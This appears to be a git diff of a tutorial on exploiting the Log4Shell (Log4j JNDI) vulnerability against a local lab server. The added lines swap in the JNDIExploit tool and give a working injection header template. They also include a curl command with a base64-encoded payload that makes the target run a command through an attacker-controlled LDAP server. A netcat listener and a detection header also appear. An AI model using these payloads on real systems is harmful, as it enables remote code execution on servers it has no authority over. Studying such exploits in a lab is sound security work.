@@ -50,7 +50,7 @@ nc -lvnp 553
 
 The `GET` request should now look something like this: 
 
-```https
+```http
 GET / HTTP/1.1
 Host: localhost:8080
 Cache-Control: ${jndi:ldaps//YOUR_IP:553}
@@ -83,15 +83,31 @@ This tells you that the server is vulnerable to the exploit.
 
 ## Exploitation 
 
-We will be using a tool called [Rogue JNDI](https://github.com/veracode-research/rogue-jndi) to exploit the server. This program contains a "`LDAP` & `HTTP` servers for exploiting insecure-by-default `Java JNDI API`". There is a `JAR` file provided in this repo to run it, use the following command as a template to run the `LDAP` server: 
+We will be using a tool called [JNDIExploit](http://web.archive.org/web/20211211031401/https://objects.githubusercontent.com/github-production-release-asset-2e65be/314785055/a6f05000-9563-11eb-9a61-aa85eca37c76?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20211211%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20211211T031401Z&X-Amz-Expires=300&X-Amz-Signature=140e57e1827c6f42275aa5cb706fdff6dc6a02f69ef41e73769ea749db582ce0&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=314785055&response-content-disposition=attachment%3B%20filename%3DJNDIExploit.v1.2.zip&response-content-type=application%2Foctet-stream) to exploit the server. This program contains a "`LDAP` & `HTTP` servers for exploiting insecure-by-default `Java JNDI API`". There is a `JAR` file provided in this repo called `LDAP-Server.jar` to run it, use the following command as a template to run the `LDAP` server: 
 
 ```sh
-java -jar target/RogueJndi-1.1.jar --command "COMMAND_TO_EXECUTE_ON_TARGET" --hostname "TARGET_IP"
+java -jar LDAP-Server.jar -i YOUR_IP -p 8888
 ```
 
+Once you start the `LDAP` server, we need to create a command to exploit the server. We will use the following as as a template: 
+
+```http
+X-Api-Version: ${jndi:ldap://LDAP_SERVER_IP:1389/Basic/Command/COMMAND_TO_EXECUTE_URL_ENCODED} 
+```
+
+For example the following command will add a file called `pwned` to the `/tmp` directory: 
+
+```sh
+curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://LDAP_SERVER_IP:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
+```
+
+> **NOTE:** This can also be used *BurpSuite* by adding the following line to the origal reqest: 
+> ```http
+> curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
+> ```
 
 
-### Are you Vulnerable? 
+## Sources  
 
 - https://github.com/NCSC-NL/log4shell
 
